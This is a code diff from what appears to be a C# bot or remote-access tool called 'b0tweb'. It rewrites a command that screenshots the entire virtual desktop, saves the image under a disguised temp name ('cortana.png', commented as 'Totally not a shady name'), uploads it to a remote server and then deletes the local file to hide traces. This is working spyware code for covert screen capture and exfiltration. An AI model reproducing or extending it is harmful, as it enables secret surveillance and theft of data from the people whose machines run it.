@@ -13,25 +13,32 @@ namespace b0tweb.Commands
 
         protected override string ExecuteCommand(string[] args)
         {
-            string[] urls = new string[Screen.AllScreens.Length];
+            // Get the bounds of the virtual screen
+            int left = SystemInformation.VirtualScreen.Left;
+            int top = SystemInformation.VirtualScreen.Top;
+            int width = SystemInformation.VirtualScreen.Width;
+            int height = SystemInformation.VirtualScreen.Height;
 
-            int i = 0;
+            // Totally not a shady name
+            string path = FileHelper.GetTemporaryFilePath("cortana.png");
 
-            foreach (Screen screen in Screen.AllScreens) 
+            // Create a new bitmap
+            using (Bitmap bmp = new Bitmap(width, height))
             {
-                Bitmap bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
+                // Get the graphics
                 using (Graphics g = Graphics.FromImage(bmp))
                 {
-                    g.CopyFromScreen(0, 0, 0, 0, Screen.PrimaryScreen.Bounds.Size);
-                    bmp.Save(@"C:\Users\x0rz3q\screenshot.png");
+                    // Copy the screen
+                    g.CopyFromScreen(left, top, 0, 0, bmp.Size);
                 }
 
-                string url = HTTPUpload.Upload(@"C:\Users\x0rz3q\screenshot.png");
-                urls[i] = url;
-                i++;
+                bmp.Save(path);
             }
 
-            return String.Join(", ", urls);
+            string url = HTTPUpload.Upload(path);
+            FileHelper.DeleteFile(path);
+
+            return url;
         }
     }
 }
